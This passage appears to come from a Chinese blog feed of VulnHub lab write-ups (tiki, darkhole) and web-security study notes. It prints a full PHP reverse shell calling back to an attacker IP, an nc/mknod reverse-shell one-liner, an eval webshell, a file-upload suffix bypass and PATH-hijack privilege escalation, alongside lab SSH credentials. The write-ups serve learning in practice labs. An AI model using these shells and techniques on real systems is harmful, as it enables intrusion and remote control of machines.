<p>失败了,我找不到网站根目录在哪里.</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221101184629.gif"></p>
<p>。。。。。。。。。。。。。</p>
<h1 id="找到网站根目录"><a href="#找到网站根目录" class="headerlink" title="找到网站根目录"></a>找到网站根目录</h1><p>默认路径: /var/www/html</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101194829.png"></p>
<p>发现前面的shell.php文件和test.php文件没能执行</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195012.png"></p>
<p>shell.php木马也没能在蚁剑上成功链接.</p>
<p>但test.txt文件是可以成功显示的</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195238.png"></p>
<p>说明这样尝试是成功的.</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>本次靶机的难度很低,最重要的就是使用nmap和Linux命令,</p>
<p>图片隐写技术在现实生活中很少能用的上,主要就是ctf比赛里面的应用,所以本次我并没有花时间篇幅去使用.</p>
<p>这次的靶机在我看来强调的就是ftp服务和ssh远程登录服务</p>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ftp协议用于计算机与计算机之间的数据传输文件传输,不同于HTTP协议.ftp服务默认开启21端口,使用账号密码登录(设置后),也可以匿名登录(不安全).</p>
<p>链接:<a href="https://www.cnblogs.com/peterYong/p/8630542.html">【FTP】详解 - peterYong - 博客园 (cnblogs.com)</a></p>
<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh协议是用来支持远程登录的协议,也可以在有限制的条件下进行文件传输与读取.</p>
<p>链接:<a href="https://blog.csdn.net/m0_52165864/article/details/126028681"> SSH服务详解_欢喜躲在眉梢里的博客-CSDN博客_ssh服务</a></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>vlunhub-tiki靶场</title>
    <url>/2022/11/02/17-48-47/</url>
    <content><![CDATA[<h1 id="vlunhub-tiki靶场（简单）"><a href="#vlunhub-tiki靶场（简单）" class="headerlink" title="vlunhub-tiki靶场（简单）"></a>vlunhub-tiki靶场（简单）</h1><h1 id="首先是遇到的问题"><a href="#首先是遇到的问题" class="headerlink" title="首先是遇到的问题"></a>首先是遇到的问题</h1><p>整次打靶过程可以说很顺利，可以很快速的达到自己想要的目的，但最重要的一点就是语言不通，进入后台后一直找不到ssh账号密码存在点，如果是实际渗透测试，可能花费的时间会更多。</p>
<p>此外还在里面留了个坑，在本次的靶机里有一个文件上传点，要在里面测试能否实现木马后门传递。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>老规矩先使用ifconfig查找自己的IP</p>
<p>使用netdiscover -r 192.168.50.1/24 探测靶机IP地址</p>
<h2 id="注"><a href="#注" class="headerlink" title="注:"></a>注:</h2><p><img src=""><img src="/imgs/$%7Bfiilename%7D/image-20221102180434475-1667383526051.png" alt="image-20221102180434475"></p>
<p>192.168.50.1   192.168.50.2     192.168.50.254 都是默认IP</p>
<h2 id="使用nmap进行扫描"><a href="#使用nmap进行扫描" class="headerlink" title="使用nmap进行扫描"></a>使用nmap进行扫描</h2><p>命令:nmap -A</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102180946.png"></p>
<p>如标注所示,在80端口找到突破点.</p>
<p>这里的ssh历史我怀疑就是后面我们能凭借网站后台得到的账号密码登陆的原因</p>
<p>或者是从这个ssh历史猜测</p>
<p>我们得到的账号密码就能考虑为ssh的登录账号密码</p>
<h2 id="网站显示"><a href="#网站显示" class="headerlink" title="网站显示"></a>网站显示</h2><p>依据扫描得到的robots.txt</p>
<p>我们进入robots.txt界面</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102182447.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102182622.png"></p>
<p>在进入箭头指示的地址界面就能得到一个登陆界面</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102182803.png"></p>
<p>在登录点尝试弱口令无果后,依据网站的Wiki cms,搜索曾经爆出的漏洞</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102183030.png"></p>
<p>此cms曾爆出过漏洞,而且作者也明确了存在该漏洞.</p>
<h2 id="Wiki-cms-漏洞利用"><a href="#Wiki-cms-漏洞利用" class="headerlink" title="Wiki cms 漏洞利用"></a>Wiki cms 漏洞利用</h2><p>依据漏洞poc进行测试</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102183900.png"></p>
<p>设定password为变量,设置payloads后就可以爆破了</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102184104.png"></p>
<h3 id="爆破成功"><a href="#爆破成功" class="headerlink" title="爆破成功"></a>爆破成功</h3><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102184431.png"></p>
<p>如图,在爆破达到一定数量后,我们使用burp抓包修改为空密码就能登陆进去了</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102184453.png"></p>
<p>登陆进去</p>
<p>在 Wiki =&gt;last changes里面找到了ssh的账号密码</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102185130.png"></p>
<p> ssh账号密码: silky:Agy8Y7SPJNXQzqA </p>
<h1 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录:"></a>ssh登录:</h1><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102185939.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102190314.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>该靶场的难度并不大,还是</p>
<p>信息收集,检测利用,得到ssh账号密码,ssh远程登录,权限查询,得到flag</p>
<p>还考了我们burp的使用</p>
<h2 id="新密码"><a href="#新密码" class="headerlink" title="新密码"></a>新密码</h2><p>嫌密码太复杂我直接修改他的密码</p>
<p>新密码：123456</p>
<p>和上个靶机一样无法使用webshell工具链接</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>vlunhub-darkhole靶场</title>
    <url>/2022/11/06/15-57-44/</url>
    <content><![CDATA[<h1 id="vlunhub-darkhole-靶场（简单-提权）"><a href="#vlunhub-darkhole-靶场（简单-提权）" class="headerlink" title="vlunhub-darkhole 靶场（简单-提权）"></a>vlunhub-darkhole 靶场（简单-提权）</h1><h1 id="首先是遇到的问题"><a href="#首先是遇到的问题" class="headerlink" title="首先是遇到的问题"></a>首先是遇到的问题</h1><h2 id="本次靶场带来了许多新知识点"><a href="#本次靶场带来了许多新知识点" class="headerlink" title="本次靶场带来了许多新知识点"></a>本次靶场带来了许多新知识点</h2><h3 id="1）反弹shell-php-reverse-shell"><a href="#1）反弹shell-php-reverse-shell" class="headerlink" title="1）反弹shell (php-reverse-shell)"></a>1）反弹shell (php-reverse-shell)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit (0);</span><br><span class="line">$ip = &quot;192.168.50.131&quot;;</span><br><span class="line">$port = &quot;8888&quot;;</span><br><span class="line"> </span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) </span><br><span class="line">	exit(&quot;$errstr ($errno)&quot;);</span><br><span class="line"> </span><br><span class="line">if(function_exists(&#x27;proc_open&#x27;))&#123;</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  </span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  </span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)  </span><br><span class="line">);</span><br><span class="line">$process = proc_open(&quot;id;/bin/sh -i&quot;, $descriptorspec, $pipes);</span><br><span class="line">if (!is_resource($process)) </span><br><span class="line">	exit(&quot;ERROR: Can&#x27;t reverse shell&quot;);</span><br><span class="line"> </span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line">	</span><br><span class="line">print(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"> </span><br><span class="line">while (1) &#123;</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$input = fread($sock, 1024);</span><br><span class="line">	fwrite($pipes[0], $input);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[1], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[2], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">&#125;	</span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line">&#125;</span><br><span class="line">else print &quot;function &#x27;proc_open&#x27; is not exists.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="食用方法"><a href="#食用方法" class="headerlink" title="食用方法"></a>食用方法</h4><p>新建php文件,将此代码复制粘贴进去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ip = &quot;192.168.50.131&quot;;</span><br><span class="line">$port = &quot;8888&quot;;</span><br></pre></td></tr></table></figure>

<p>修改上述ip和端口</p>
<p>ip为攻击机ip,端口自定</p>
<p>我的为kali系统,所以IP为kali的IP地址,端口为卡里 nc -lvvp “端口”</p>
<h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2)提权"></a>2)提权</h2><p>在本靶机里涉及到三次提权,后文会依次说明</p>
<h3 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty as pt;pt.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="环境变量提权-joho提权"><a href="#环境变量提权-joho提权" class="headerlink" title="环境变量提权(joho提权)"></a>环境变量提权(joho提权)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;bash&#x27; &gt; /tmp/id;chmod +x /tmp/id; export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>



<h3 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h3><p>在该方式下 chmod 777 id 的解释:</p>
<p><a href="https://blog.csdn.net/rjszz1314/article/details/104399333">chmod 777 到底是啥 ???看完这个你就完全懂了！_人间世庄子的博客-CSDN博客_chmod777</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp   // 回到tmp目录</span><br><span class="line">touch id   //创建假的id命令文件</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; id//id文件中写入/bin/bash 字段，生成一个shell</span><br><span class="line">chmod 777 id    //赋予id全文件权限</span><br><span class="line">export PATH=/tmp:$PATH //设置环境变量</span><br><span class="line">cd /home/john</span><br><span class="line">./toto</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/wangxueying5172/article/details/121552506"> DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
<p><a href="http://lnmp.ailinux.net/id">http://lnmp.ailinux.net/id</a></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-老规矩-查看靶机IP地址"><a href="#1-老规矩-查看靶机IP地址" class="headerlink" title="1.老规矩,查看靶机IP地址"></a>1.老规矩,查看靶机IP地址</h2><p>使用netdiscover -r 192.168.50.1/24 探测靶机IP地址</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221106161918.png"></p>
<p>192.168.50.133</p>
<h2 id="2-nmap-A进行系统性信息收集"><a href="#2-nmap-A进行系统性信息收集" class="headerlink" title="2.nmap -A进行系统性信息收集"></a>2.nmap -A进行系统性信息收集</h2><p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%871.png"></p>
<p>可以发现靶机开放了80端口和22端口,ssh服务开放</p>
<p>nmap中无法获得更近一步的信息,</p>
<h1 id="网站破口漏洞-越权修改密码"><a href="#网站破口漏洞-越权修改密码" class="headerlink" title="网站破口漏洞:越权修改密码"></a>网站破口漏洞:越权修改密码</h1><p>访问192.168.50.133的80端口</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%872.png"></p>
<p>看到一个登录口,可以测试弱口令,sql注入等</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%873.png"></p>
<p>前期我们已经通过注册账户测试知道该后台已存在admin账户</p>
<p>在此我们注册测试账户:test/test</p>
<p>通过测试账户登录后,后台界面普通账户只有修改账户密码的功能</p>
<p>使用burp suite抓包</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%874.png"></p>
<p>如图所标注,该账号是我测试所注册的第三个账号,推测该后台存在一个id=1的admin账户,前期测试时以确定可以通过修改提交信息中的id值可以修改对应id的账户密码.</p>
<h3 id="使用测试账户修改admin账户的密码后"><a href="#使用测试账户修改admin账户的密码后" class="headerlink" title="使用测试账户修改admin账户的密码后"></a>使用测试账户修改admin账户的密码后</h3><p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%876.png"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>该管理员账户可以远程上传文件,所以我们可以尝试上传木马文件留下我们的后门.</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%877.png"></p>
<p>发现有文件后缀名检测,但没有检测我们的文件内容,尝试后缀名绕过,</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%878.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%879.png"></p>
<p>测试一圈后发现该后台进行了文件上传的限制有点大,(遇到的情况太少,经验不足以解决.)查找攻略后发现phtml后缀的php代码文件可以上传,可以执行</p>
<p>先上传一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>代码执行成功</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8710.png"></p>
<p>那就可以上传我们的小马了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_post[shell]);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="使用蚁剑链接"><a href="#使用蚁剑链接" class="headerlink" title="使用蚁剑链接"></a>使用蚁剑链接</h3><p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8711.png"></p>
<p>可以看到蚁剑已经连接成功,</p>
<p>但在测试访问文件时发现权限太低无法获取更多权限.</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="提权1-失败"><a href="#提权1-失败" class="headerlink" title="提权1:失败"></a>提权1:失败</h2><p>在查看攻略时,使用了一种 我没见过的提权方法</p>
<h3 id="使用mknod命令提权"><a href="#使用mknod命令提权" class="headerlink" title="使用mknod命令提权"></a>使用mknod命令提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mknod 设备名称  p &amp;&amp; nc  kali 的ip   kali的端口  0&lt;设备名称 | /bin/bash 1&gt;设备名称</span><br><span class="line">example: mknod backdoor p &amp;&amp; nc 192.168.133.131 8888 0&lt;backdoor | /bin/bash 1&gt;backdoor 获取回显窗口</span><br></pre></td></tr></table></figure>

<p>在蚁剑虚拟终端中输入上述对应的代码后,再在kali中使用nc监听端口,但我测试失败了,搞不懂.</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8712.png"></p>
<p>原文链接:<a href="https://blog.csdn.net/wangxueying5172/article/details/121552506"> DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
<p>参考文章:<a href="https://www.cnblogs.com/hnrainll/archive/2011/06/10/2077583.html">mknod用法以及主次设备号 - Leo Chin - 博客园 (cnblogs.com)</a></p>
<h1 id="提权2-成功"><a href="#提权2-成功" class="headerlink" title="提权2:成功"></a>提权2:成功</h1><p>在另一篇博文中找到了另一种直接将shell反弹到我们攻击机的方法(就是反弹shell)</p>
<h2 id="php-reverse-shell"><a href="#php-reverse-shell" class="headerlink" title="php-reverse-shell"></a>php-reverse-shell</h2><p>得益于前期测试出的php代码可执行后缀phtml</p>
<p>我们的反弹shell文件得以上传执行</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8713.png"></p>
<p>get shell成功后,我们的权限还是太低了,kali 中获得shell 窗口，但是返回的shell 没有显示你所在文件目录,现阶段是那个用户，所以需要使用python 来返回一个shell，大多数Linux 都安装了python3，所以使用python3 来生成一个shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty as pt;pt.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章后我才知道这种方式获得到的shell是不能使用ctrl +c 以及箭头指令的</p>
<p>参考文章:<a href="https://blog.csdn.net/weixin_44604541/article/details/117554884">实现交互式shell的几种方式：python pty 方式、升级nc、socat、script获取pty_思源湖的鱼的博客-CSDN博客_python pty</a></p>
<p>拿到完整的shell后就可以进一步测试了</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8714.png"></p>
<p>如图,进行大部分已知到的测试后发现权限还是太低了,得提权到root权才能达到我们的目的</p>
<h2 id="环境变量提权-失败"><a href="#环境变量提权-失败" class="headerlink" title="环境变量提权(失败)"></a>环境变量提权(失败)</h2><p>参考文章:<a href="https://www.freebuf.com/articles/others-articles/284338.html">DARKHOLE: 1靶机 - FreeBuf网络安全行业门户</a></p>
<p>该提权是在pass ward文件所在的文件路径下的提权 home/john</p>
<p>使用方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;bash&#x27; &gt; /tmp/id;chmod +x /tmp/id; export PATH=/tmp:$PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8715.png"></p>
<p>失败了</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8716.png"></p>
<p>环境变量提权参考文章:[( Linux环境变量劫持提权_全局变量Global的博客-CSDN博客_linux环境变量提权)](<a href="https://blog.csdn.net/nicai321/article/details/122275160#:~:text=linux">https://blog.csdn.net/nicai321/article/details/122275160#:~:text=linux</a> 的 环境变量提权 跟window的 环境变量提权 的思路也是一致的%2C当执行某个命令时%2CShell会按PATH 环境变量 的路径依次搜索命令%2C搜到即停止。,的 劫持提权 。 提权 方法：利用系统命令修改 环境变量 路径 劫持提权)</p>
<h2 id="另一种环境变量提权-成功"><a href="#另一种环境变量提权-成功" class="headerlink" title="另一种环境变量提权(成功)"></a>另一种环境变量提权(成功)</h2><p>该方法其实和上方失败的方法是本质是一样的,都是通过劫持环境变量,使用假命令来达到欺骗系统的目的</p>
<p>原文描述:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">切换到/home/john目录下，发现toto文件有执行权限，发现敏感文件user.txt 与 password</span><br><span class="line">执行toto</span><br><span class="line">发现toto文件的功能就是查询用户的uid gid 等参数，与命令id 功能相同,猜测toto文件可能使用的id命令，所以，如果我新建一个假的id命令，id文件中写入/bin/bash 字段，生成一个shell，从而达到提权的目的，因为现在所处的目录没有写的权限，所以在/tmp 目录下新建id文件</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221106182157.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch id</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; id</span><br><span class="line">chmod 777 id</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/john</span><br><span class="line">./toto</span><br></pre></td></tr></table></figure>



<p>参考文章:<a href="https://blog.csdn.net/rjszz1314/article/details/104399333">chmod 777 到底是啥 ???看完这个你就完全懂了！_人间世庄子的博客-CSDN博客_chmod777</a></p>
<p>得益于文章描述很详细</p>
<p>虽然不怎么明白但提权成功了</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8717.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8718.png"></p>
<p>这张图就可以看出我们从www-data 网站权限提升到了root权限组下的用户权限得到了john用户的密码</p>
<p>但当我尝试 sudo su root 切换到root权限时,系统阻止我了</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8719.png"></p>
<p>根据攻略,这里又有一道转换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">#执行命令输入密码，回显可知，john可以以root的身份执行file.py</span><br><span class="line">所以在file.py 文件中写入 import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">sudo 执行，即可提权</span><br><span class="line">进入root 目录，即可通关</span><br></pre></td></tr></table></figure>

<p>两个攻略都提及到了这种方法</p>
<p><a href="https://www.freebuf.com/articles/others-articles/284338.html">DARKHOLE: 1靶机 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/wangxueying5172/article/details/121552506">DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
<h1 id="root提权成功"><a href="#root提权成功" class="headerlink" title="root提权成功"></a>root提权成功</h1><p>经过上面的一顿操作后终于获得了root权限</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8720.png"></p>
<p>好复杂,好多不知道的,好多要学的</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8721.png"></p>
<p>登录进靶机验证</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8722.png"></p>
<h1 id="成功"><a href="#成功" class="headerlink" title="成功!"></a>成功!</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>本次靶场从网站漏洞到获得服务器权限都并不复杂</p>
<p>复杂的是在服务器内部提权的过程</p>
<p>普通的文件上传的漏洞利用,甚至都没有如何为难我们的文件上传,</p>
<p>在这其中我也学到了反弹shell的一种应用,后期还有多种方法,</p>
<p>在服务器内部的提权也是没见过的例子,有很多知识点都没见过.</p>
<h1 id="常看常新-多多学习"><a href="#常看常新-多多学习" class="headerlink" title="常看常新!多多学习~"></a>常看常新!多多学习~</h1><p><img src="/imgs/$%7Bfiilename%7D/%E7%B2%89%E5%A2%A9%E5%AD%90.gif"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>web基础</title>
    <url>/2022/10/17/17-43-58/</url>
    <content><![CDATA[<h1 id="总结一下到目前所学的基础知识"><a href="#总结一下到目前所学的基础知识" class="headerlink" title="总结一下到目前所学的基础知识:"></a>总结一下到目前所学的基础知识:</h1><p>大概涉及很多方面但涉及到的深入一点的也会另开新卷详细描述</p>
<p>主要涉及到的都是小迪2020课程里面的内容:</p>
<p>常常更新</p>
<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄:"></a>摘抄:</h2><p><strong>1：攻击方与防御方的本质是什么？</strong>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。<strong>2：安全公司的本质是什么？</strong>盈利，最小投入，最大产出。<strong>3：安全公司产品的本质是什么？</strong>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张，宽带不足等问题的客户）<strong>4：安全人员的本质是什么？</strong>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。<strong>5：对接客户的本质是什么？</strong>对接客户也是某公司内安全工作的一员，与概念 4 相同。清晰了以上 5 个概念，作为攻击者，要首先考虑到对抗成本，什么样的对抗成本，能满足概念 1-5。影响或阻碍对手方的核心利益。把概念加入到后门，更隐蔽，更长久。</p>
<h2 id="HTTP-规划定义了-8-种可能的请求方法："><a href="#HTTP-规划定义了-8-种可能的请求方法：" class="headerlink" title="HTTP 规划定义了 8 种可能的请求方法："></a>HTTP 规划定义了 8 种可能的请求方法：</h2><p>GET：检索 URL 中标识资源的一个简单请求 </p>
<p>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档 </p>
<p>POST：服务器接受被写入客户端输出流中的数据的请求 </p>
<p>PUT：服务器保存请求数据作为指定 URL 新内容的请求 </p>
<p>DELETE：服务器删除 URL 中命令的资源的请求 </p>
<p>OPTIONS：关于服务器支持的请求方法信息的请求 </p>
<p>TRACE：web 服务器反馈 Http 请求和其头标的请求 </p>
<p>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理 </p>
<p>#请求头由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 </p>
<h2 id="HTTP-响应码："><a href="#HTTP-响应码：" class="headerlink" title="HTTP 响应码："></a>HTTP 响应码：</h2><p>1xx：信息，请求收到，继续处理 </p>
<p>2xx：成功，行为被成功地接受、理解和采纳 </p>
<p>3xx：重定向，为了完成请求，必须进一步执行的动作 </p>
<p>4xx：客户端错误 </p>
<p>5xx：服务器错误 </p>
<h1 id="信息收集决定攻击深度"><a href="#信息收集决定攻击深度" class="headerlink" title="信息收集决定攻击深度"></a>信息收集决定攻击深度</h1><p><img src="/imgs/$%7Bfiilename%7D/image-20220929190720671.png"></p>
<h2 id="信息收集是攻击面打开的必要操作"><a href="#信息收集是攻击面打开的必要操作" class="headerlink" title="信息收集是攻击面打开的必要操作"></a>信息收集是攻击面打开的必要操作</h2><p>更多的信息可以测试更多的漏洞方面</p>
<p>无论是src还是渗透测试一个具体目标</p>
<p>信息收集的方式多种多样</p>
<p>有像fofa一样的在黑暗引擎中大海捞针,不错过与测试网站相关的一个页面</p>
<p>有得到一个web页面后对网站进行扫描,收集IP地址开放的端口号,网站后台目录,后台文件,有时候我们的突破口就产生在这里面</p>
<p>最常用的就是御剑后台扫描工具,nmap工具,kali里的dirp 工具,部署在服务器端上的msf(这是一个大学问) ,还有一款叫水泽的信息收集工具,等等,后面知道更多了还会添加.</p>
<p>内网信息收集是针对进入目标主机后进行的信息收集操作,此方面涉及到系统的操作命令学习,</p>
<p>（<a href="https://blog.csdn.net/qq_43001579/article/details/83591539">(真·Nmap用法大全_车大叔的博客-CSDN博客</a>）</p>
<h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充:"></a>其他补充:</h3><p>F12进行查看网站网络可以看到server：里面的信息</p>
<p>server：看的信息很全的很可能就是由网页搭建平台搭建的</p>
<p>WAF存在时，扫描会产生误差，网站可能拒绝访问</p>
<p>检查时网站返回的数据包里面可能有某些可疑信息，里面可能就是含有WAF</p>
<p>（X-Powered-By：WAF）</p>
<p>子域名查找及C段旁注等。</p>
<h1 id="web漏洞知识点"><a href="#web漏洞知识点" class="headerlink" title="web漏洞知识点"></a>web漏洞知识点</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220905205200543.png"></p>
<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞:"></a>文件上传漏洞:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220906174853666.png"></p>
<h4 id="查找与判断"><a href="#查找与判断" class="headerlink" title="查找与判断"></a>查找与判断</h4><p>黑盒测试，扫描</p>
<p>搜索引擎搜索upload</p>
<p>会员文件传输页面</p>
<p>后台权限页面</p>
<p>白盒代码分析查找文件上传源码</p>
<p>文件上传抓包判断</p>
<p>黑名单：明确不让上传的格式后缀</p>
<p>在定义后缀名不完整的情况下，我们可以用其他格式，达到同样效果，看网站的知识应用层面</p>
<p>白名单：明确可以上传的格式后缀</p>
<p>更安全一些</p>
<h3 id="文件上传漏洞测试思维"><a href="#文件上传漏洞测试思维" class="headerlink" title="文件上传漏洞测试思维"></a>文件上传漏洞测试思维</h3><p>1,通过字典扫描，或者判断会员中心等都可能存在文件上传漏洞</p>
<p>2,到测试站点是否存在解析漏洞如：iis apache Nginx 等</p>
<p>3,测试文件上传漏洞，是否可以验证或者绕过，上传一个php文档判断黑白名单，判断是否存在格式限制或内容审查</p>
<p>4,若上面的内容都没有则判断，是否为cms漏洞，在知道cms类型后可以搜索是否爆出过漏洞</p>
